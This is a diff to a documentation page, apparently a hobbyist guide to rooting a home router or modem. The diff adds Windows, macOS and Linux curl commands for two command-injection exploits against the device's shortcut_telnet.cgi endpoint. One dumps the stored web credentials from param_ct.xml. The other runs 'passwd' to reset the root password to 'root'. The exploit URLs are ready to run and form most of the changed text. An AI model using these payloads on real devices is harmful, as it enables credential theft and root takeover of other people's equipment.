@@ -123,8 +123,37 @@ The default web credentials can be found in `/ptrom/ptconf/param_ct.xml` and mod
 
 ??? bug "Exploit to disclose the default web credentials"
     
-    To dump the web credentials from `/ptrom/ptconf/param_ct.xml`, navigate to
+    To dump the web credentials from `/ptrom/ptconf/param_ct.xml`, navigate to:
+
     <http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml>
+
+    Alternatively, run the following command to download `param_ct.xml` to a temporary directory.
+
+    === ":fontawesome-brands-windows: Windows"
+
+        !!! info "curl is available for download at <https://curl.se/windows/>"
+
+        ``` sh
+        curl -o "%temp%\param_ct.xml" "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml"
+        ```
+
+    === ":material-apple: macOS"
+
+        !!! note "The following commands assume [Homebrew](https://brew.sh) is installed"
+
+        ``` sh
+        brew install curl
+        curl -o "/tmp/param_ct.xml" "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml"
+        ```
+
+    === ":material-linux: Linux"
+
+        !!! note "The following commands assume a Debian-based distribution"
+
+        ``` sh
+        sudo apt-get install curl
+        curl -o "/tmp/param_ct.xml" "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?cat%20%2Fptrom%2Fptconf%2Fparam_ct.xml"
+        ```
 
 === "&lt;= v1.0.20"
 
@@ -193,17 +222,31 @@ us.
     !!! warning "The root password is not known at this time"
 
     ???+ bug "Exploit to temporarily change the root password"
-        Run the following command to temporarily change the root password to `root`:
+        Run the following command to temporarily change the root password to `root`.
 
         === ":fontawesome-brands-windows: Windows"
+
+            !!! info "curl is available for download at <https://curl.se/windows/>"
 
             ``` sh
             curl -s -o null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
             ```
 
-        === ":material-apple: macOS / :material-linux: Linux"
+        === ":material-apple: macOS"
+
+            !!! note "The following commands assume [Homebrew](https://brew.sh) is installed"
 
             ``` sh
+            brew install curl
+            curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
+            ```
+
+        === ":material-linux: Linux"
+
+            !!! note "The following commands assume a Debian-based distribution"
+
+            ``` sh
+            sudo apt-get install curl
             curl -s -o /dev/null "http://192.168.11.1/cgi-bin/shortcut_telnet.cgi?%7B%20echo%20root%20%3B%20sleep%201%3B%20echo%20root%3B%20%7D%20%7C%20passwd%20root"
             ```
 
